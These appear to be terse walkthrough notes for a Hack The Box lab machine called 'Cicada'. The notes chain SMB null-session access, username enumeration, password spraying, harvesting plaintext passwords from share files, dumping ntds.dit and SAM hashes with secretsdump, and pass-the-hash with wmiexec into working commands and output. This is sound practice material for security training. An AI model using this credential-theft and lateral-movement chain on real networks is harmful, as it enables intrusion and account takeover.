found hostmaster.cicada.htb dns 
 1. SMB
 smbclient //10.10.11.35/HR -U " "%" "
 we found file Notice from HR.txt
Your default password is: Cicada$M6Corpb*@Lp#nZp!8

2. Kerbrute
kerbrute userenum -d cicada.htb --dc 10.10.11.35 ./xato-net-10-million-usernames.txt Cicada$M6Corpb*@Lp#nZp!8

2025/01/26 05:55:48 >  [+] VALID USERNAME:       guest@cicada.htb
2025/01/26 05:55:54 >  [+] VALID USERNAME:      administrator@cicada.htb

3. crackmapexec
sudo crackmapexec smb 10.10.11.35 -u guest -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

 4. SMB_LOGIN
 we create user file and run smb_login in msfconsole
[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'

5. crackmapexec SMB
sudo crackmapexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 1 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3                             

6. SMB 
smbmap -u david.orelious -p 'aRt$Lp#7t*VQ!3' -d CICADA.HTB -H 10.10.11.35 --download "DEV\Backup_script.ps1" 
/home/kali/Desktop/test/10.10.11.35-DEV_Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$ backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

then we enumerate shares for emily
IP: 10.10.11.35:445 Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ ONLY       Remote Admin
        C$                                                      READ ONLY       Default share

then we found in C$ share \Users\emili\Desktop\user.txt
we also found in \Temp\sam,system and Windows\Systme32\ntds.dit and get
python3 secretsdump.py -ntds ntds.dit -system system -sam sam -hashes lmhash:nthash LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

geting root access
python3 ./wmiexec.py Administrator@10.10.11.35 -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341